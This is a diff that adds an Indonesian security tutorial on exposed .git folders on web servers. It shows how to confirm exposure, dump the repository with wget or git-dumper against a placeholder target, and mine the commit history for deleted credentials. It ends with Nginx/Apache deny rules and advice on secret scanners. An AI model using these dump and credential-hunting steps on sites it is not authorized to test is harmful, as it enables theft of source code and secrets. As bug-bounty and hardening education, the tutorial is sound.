@@ -1,0 +1,168 @@
+# Information Disclosure: Exposed Version Control (.git) di Server
+
+Folder `.git` adalah direktori tersembunyi yang dibuat oleh sistem Git ketika sebuah repository diinisialisasi. Di dalamnya tersimpan seluruh riwayat commit, riwayat perubahan kode, konfigurasi user, branch, hingga hash objek dari setiap file dalam proyek.
+
+Jika folder `.git` ini tanpa sengaja ikut terunggah atau terakses secara publik melalui HTTP (`https://target-website.com/.git/`), penyerang dapat **mengunduh ulang seluruh kode sumber dan riwayat proyek secara utuh**.
+
+---
+
+## 1. Mengapa Folder `.git` Bisa Terbuka ke Publik?
+
+Celah ini biasanya terjadi karena metode deployment yang salah:
+
+- Developer melakukan `git clone` atau `git pull` langsung di dalam folder web server produksi (`/var/www/html/`).
+- Web server tidak dikonfigurasi untuk memblokir akses ke berkas atau folder berawalan titik (`.*` / hidden dotfiles).
+
+---
+
+## 2. Praktik Investigasi & Eksploitasi
+
+### Langkah 1: Memeriksa Ketersediaan Folder `.git`
+
+Langkah awal pengujian adalah membuka URL `.git/config` atau `.git/HEAD` di browser:
+
+```text
+https://target-website.com/.git/config
+```
+
+Jika server merespons dengan status `200 OK` dan menampilkan konfigurasi git:
+
+```ini
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote "origin"]
+	url = https://github.com/company-org/internal-web-app.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
+```
+
+> [!IMPORTANT]
+> Respons di atas membuktikan bahwa seluruh direktori `.git` dapat diakses oleh publik!
+
+---
+
+### Langkah 2: Mengunduh Seluruh Repository
+
+Ada dua metode umum untuk mengekstrak folder `.git` yang terbuka:
+
+#### Metode A: Menggunakan `wget` (Jika Directory Listing aktif)
+
+```bash
+# Unduh rekursif seluruh isi folder .git
+wget -r -np -R "index.html*" https://target-website.com/.git/
+```
+
+#### Metode B: Menggunakan Tool Khusus (`git-dumper` / `go-git-dump`)
+
+Jika web server menonaktifkan directory listing (tidak menampilkan daftar file), `wget` biasa tidak dapat mendownload semua objek hash. Penyerang menggunakan tool seperti `git-dumper` yang secara pintar membaca file `index` dan `objects` Git:
+
+```bash
+# Instalasi git-dumper
+pip install git-dumper
+
+# Dump repository ke direktori lokal
+git-dumper https://target-website.com/.git/ ./leaked-project-code
+```
+
+Setelah proses selesai, buka folder hasil unduhan di VS Code atau terminal:
+
+```bash
+cd ./leaked-project-code
+ls -la
+```
+
+Seluruh file proyek akan terkonstruksi kembali persis seperti di komputer developer!
+
+---
+
+### Langkah 3: Mengaudit Riwayat Commit & Kebocoran Kredensial
+
+Salah satu kesalahan paling umum developer adalah **pernah melakukan commit password atau API key, lalu menghapusnya di commit berikutnya**.
+
+Meskipun di branch terbaru file sudah bersih, riwayat commit di Git tetap menyimpan password tersebut selamanya!
+
+```bash
+# Memeriksa seluruh riwayat commit beserta perubahan kodenya
+git log -p
+
+# Mencari kata kunci spesifik di seluruh riwayat git
+git log -S "password" -p
+git log -S "API_KEY" -p
+```
+
+Contoh commit log yang mencurigakan:
+
+```diff
+commit a4f8b912c3008000f6b34e5400930084
+Author: developer <dev@internal.local>
+Date:   Mon Jan 12 14:20:10 2026 +0700
+
+    Remove hardcoded production database credentials
+
+diff --git a/config/database.js b/config/database.js
+index 8e45a2b..3c11d04 100644
+--- a/config/database.js
++++ b/config/database.js
+@@ -1,6 +1,6 @@
+ module.exports = {
+   host: process.env.DB_HOST,
+-  password: "SuperSecretProductionPassword!2026",
++  password: process.env.DB_PASSWORD,
+   user: process.env.DB_USER,
+ };
+```
+
+> [!CAUTION]
+> Melalui `git log -p`, penyerang menemukan password produksi yang dihapus developer pada commit terdahulu!
+
+---
+
+## 3. Tingkat Keparahan (Severity: HIGH / CRITICAL)
+
+Kerentanan exposed `.git` hampir selalu dikategorikan sebagai **High** hingga **Critical** dalam program Bug Bounty dan audit keamanan karena:
+
+1. **Source Code Disclosure Penuh:** Membuka seluruh logika internal aplikasi, proprietary algorithms, dan rahasia bisnis.
+2. **Hardcoded Secrets:** Memungkinkan penyerang menemukan kredensial database, private key SSH, token AWS/GCP, dan credential cloud lainnya.
+3. **Peta Titik Lemah:** Mempermudah pencarian celah zero-day di kode backend.
+
+---
+
+## 4. Pencegahan & Remediasi (Best Practices)
+
+### 1. Blokir Akses Hidden Files (`.*`) di Web Server
+
+Pastikan web server (Nginx/Apache) menolak permintaan ke semua file dan folder berawalan titik:
+
+**Konfigurasi Nginx:**
+
+```nginx
+# Tolak akses ke folder dan file berawalan tanda titik (.git, .env, .htaccess, dll)
+location ~ /\.(?!well-known) {
+    deny all;
+    access_log off;
+    log_not_found off;
+    return 404;
+}
+```
+
+**Konfigurasi Apache (`.htaccess` atau `httpd.conf`):**
+
+```apache
+<DirectoryMatch "^\.|\/\.">
+    Order allow,deny
+    Deny from all
+</DirectoryMatch>
+```
+
+### 2. Gunakan Pipeline CI/CD yang Bersih
+
+Jangan lakukan `git clone` langsung di production server. Gunakan build artifact atau Docker container yang hanya menyalin hasil build (misal: folder `dist/` atau `build/`) tanpa menyertakan direktori `.git`.
+
+### 3. Gunakan Git Secret Scanner
+
+Pasang tool seperti `gitleaks` atau `trufflehog` pada pre-commit hook dan CI/CD pipeline untuk mencegah kredensial ter-commit ke dalam Git sejak awal.
